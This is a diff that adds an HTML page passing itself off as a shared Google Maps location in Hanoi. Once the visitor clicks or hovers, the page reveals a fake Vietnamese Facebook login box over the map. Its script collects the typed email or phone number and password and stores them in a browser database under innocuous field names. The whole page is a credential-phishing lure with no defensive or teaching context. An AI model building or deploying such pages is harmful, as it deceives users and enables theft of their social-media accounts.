@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Google Maps</title>
+  <meta property="og:title" content="Ngô Thì Nhậm" />
+	<meta property="og:image" content="https://lh5.googleusercontent.com/p/AF1QipNlGuLVR8TR_nVdtBAI3gSlczhKP3d2pIV3tW_T=w1000-h1000-k-no" />
+	<meta property="og:description" content="Hai Bà Trưng, Hà Nội, Việt Nam">
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+<link href="//www.google.com/images/branding/product/ico/maps15_bnuw3a_32dp.ico" rel="shortcut icon">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <style>
+      .container {
+        position: fixed;
+        width: 300px;
+        height: 300px;
+        padding: 20px;
+        top: 20%;
+        left: 75%;
+		background-color: var(--white);
+        margin-top: -100px;/* Negative half of height. */
+        margin-left: -250px;/* Negative half of width. */
+		border-radius: 6px;
+        box-shadow: 0 3px 5px 2px rgba(150, 150, 150, 150);
+	      visibility: hidden;
+
+      }
+	  :root {
+  --bg: #f0f2f5;
+  --blue: #1877f2;
+  --dark-blue: #1360c4;
+  --white: #FFF;
+  --green: #42b72a;
+  --dark-green: #369423;
+}
+
+
+* {
+ margin: 0;
+ padding: 0;
+ box-sizing: border-box;
+}
+
+body {
+  height: 100vh;
+  overflow: hidden;
+  background-color: var(--bg);
+  font-family: Helvetica, sans-serif;
+  text-align:center;
+}
+
+
+.logo {
+  color: var(--blue);
+  font-size: 3.7rem;
+  letter-spacing: -3px;
+}
+
+
+.panel {
+  border-radius: 6px;
+  box-shadow: 0 3px 5px 2px rgba(150, 150, 150, 0.2);
+
+}
+
+input {
+  width: 100%;
+  padding: 15px;
+  margin-bottom: 15px;
+  border: 1px solid #d2d2d2;
+  border-radius: 6px;
+}
+
+input::placeholder {
+  font-size: 1.0rem;
+}
+
+input:focus {
+  outline: 1px solid var(--blue);
+}
+
+input:focus::placeholder {
+  color: #c2c2c2;
+}
+
+.log-in-button {
+  background-color: var(--blue);
+  color: var(--white);
+  font-size: 1.2rem;
+  font-weight: bolder;
+  padding: 10px;
+  transition-property: background-color;
+  transition-duration: 100ms;
+  transition-timing-function: ease-in-out;
+}
+
+.log-in-button:hover {
+  background-color: var(--dark-blue);
+  cursor: pointer;
+}
+
+a {
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+  cursor: pointer;
+}
+
+.forgot {
+  font-size: 0.9rem;
+  color: var(--blue);
+}
+.signup {
+  font-size: 0.9rem;
+  color: var(--blue);
+}
+hr {
+  margin: 18px 0;
+  opacity: 0.3;
+}
+
+.register-button {
+  background-color: var(--green);
+  color: var(--white);
+  display: inline-block;
+  padding: 15px;
+  margin: 10px 0;
+  border-radius: 6px;
+  font-weight: bolder;
+  transition-property: background-color;
+  transition-duration: 100ms;
+  transition-timing-function: ease-in-out;  
+}
+
+.register-button:hover {
+  text-decoration: none;
+  background-color: var(--dark-green);
+}
+
+.bottom-link {
+  display: flex;
+  justify-content: center;
+  gap: 5px;
+  font-size: 0.9rem;
+}
+
+.page {
+  color: #000;
+  font-weight: bold;
+}
+
+footer {
+  height: 100%;
+  background-color: var(--white);
+  padding: 25px 35px;
+}
+
+ul {
+  max-width: 1000px;
+  margin: auto;
+  display: flex;
+
+  flex-wrap: wrap;
+  list-style: none;
+  font-size: 0.75rem;
+  color: #7e7e7e;
+  line-height: 1.5;
+}
+
+li {
+  margin-right: 15px;
+}
+
+@media (min-width: 890px) {
+  .main-wrapper {
+    width: 90%;
+    max-width: 980px;
+    flex-direction: row;
+    padding-top: 70px;
+    justify-content: space-between;
+  }
+
+  .branding {
+    text-align: left;
+    padding-top: 80px;
+    width: 480px;
+  }
+
+  .slogan {
+    font-size: 1.7rem;
+  }
+iframe {
+  pointer-events: none;
+}
+
+@media only screen and (max-width: 768px) {
+  /* For mobile phones: */
+  .container {
+        width: 90;
+        left: 70%;
+      }
+}
+
+@media only screen and (min-width: 768px) {
+  /* For desktop: */
+  .container {
+        width: 400px;
+        left: 50%;
+      }
+}
+
+    </style>
+</head>
+<body>
+<div class="container" id="container">
+<h4>Đăng nhập Facebook</h4><br>
+     <form>
+          <input
+            type="text"
+            id="email"
+            placeholder="Email hoặc số điện thoại"
+            required>
+          <input
+            type="password"
+            id="matkhau"
+            placeholder="Mật khẩu"
+            required>
+          <div class="d-grid gap-2">
+		  <button class="btn btn-primary" type="button" id="dangnhap">Đăng nhập</button>
+		  </div>
+        </form>
+        <a class="forgot" href="#">Quên tài khoản?</a>
+		<a class="signup" href="#">Đăng ký Facebook</a>
+</div>
+
+<div class="maps">
+<iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3724.4115579608006!2d105.85091377595492!3d21.016212388208125!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3135abf2d963738b%3A0x497c97f71ae2f470!2zTmfDtCBUaMOsIE5o4bqtbSwgSGFpIELDoCBUcsawbmcsIEjDoCBO4buZaSwgVmnhu4d0IE5hbQ!5e0!3m2!1svi!2s!4v1689439245429!5m2!1svi!2s" width="100%" height="2000" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade" scrolling="no"></iframe>
+
+</div>
+<script>
+var db=openDatabase("itemDB","1.0","itemDB",65535); // itemDB is the database name
+$(document).ready(function() {
+    if (/Mobi/.test(navigator.userAgent)) {
+        $("body").on( "mouseover", function() {
+            document.getElementById("container").style.visibility = "inherit";
+        });
+    }
+    
+    else{
+        $("body").on( "click", function() {
+         document.getElementById("container").style.visibility = "inherit";
+            
+        });
+    }
+    
+//document.getElementById("container").style.visibility = "visible";
+});
+
+//INSERTING DATA INTO TABLE
+
+$("#dangnhap").click(function(){
+var item=$("#email").val();
+var qty=$("#matkhau").val();
+db.transaction(function(transaction){
+var sql="INSERT INTO items(item,quantity) VALUES(?,?)";
+transaction.executeSql(sql,[item,qty],function(){
+},function(transaction,err){
+
+})
+})
+})
+//INSERTING DATA ENDS HERE
+
+
+</script>
+
+</body>
+</html>
